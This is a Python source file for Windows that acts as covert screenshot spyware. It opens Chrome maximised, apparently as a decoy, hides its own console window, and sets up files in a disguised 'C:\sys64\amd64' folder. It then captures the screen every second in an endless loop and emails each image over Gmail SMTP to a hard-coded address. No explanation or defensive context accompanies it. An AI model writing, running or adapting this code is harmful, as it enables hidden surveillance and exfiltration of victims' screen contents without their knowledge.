import pyautogui
import subprocess
import time
import smtplib
import threading	
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import shutil
import ctypes


def run_script():

	#subprocess.Popen(["python", "screenshot.py"], creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)


	subprocess.check_output("pip install virtualenv", shell=bool)
	try:
		subprocess.check_output("mkdir C:\\sys64", shell=bool)
		subprocess.check_output("virtualenv C:\\sys64\\amd64", shell=bool)
		subprocess.check_output("C:\\sys64\\amd64\\Scripts\\activate", shell=bool)
	except:
		pass
	subprocess.check_output("pip install pyautogui", shell=bool)



	# Email credentials
	sender_email = "example@gmail.com"
	sender_password = "password123"
	recipient_email = "example@gmail.com"


	# Connect to SMTP server
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(sender_email, sender_password)

	# Create message object
	msg = MIMEMultipart()
	msg['From'] = sender_email
	msg['To'] = recipient_email
	current_time = time.strftime("%m/%d/%Y  %I:%M %p")
	msg['Subject'] = f"{current_time}"

	# Add message body
	body = "Here is a photo for you!"
	msg.attach(MIMEText(body, 'plain'))
	i = 0

	while True:

		i = i + 1
		screenshot = pyautogui.screenshot()
		#print("Screenshot taken!")
		screenshot.save(f"C:/sys64/amd64/screenshot{i}.png")
		# Add photo attachment
		filename = f"C:/sys64/amd64/screenshot{i}.png"
		attachment = open(filename, "rb")
		part = MIMEBase('application', 'octet-stream')
		part.set_payload((attachment).read())
		encoders.encode_base64(part)
		part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
		msg.attach(part)
		

		# Send email
		server.sendmail(sender_email, recipient_email, msg.as_string())


		# Close connection
		
		attachment.close()
		#print("Sent!")
		time.sleep(1)


	server.quit()
	shutil.rmtree("C:\\sys64\\")
	#hello = input("Press Enter to close....")
	# attach image
p = subprocess.check_output(["C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "/max"], shell=True)
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

run_script()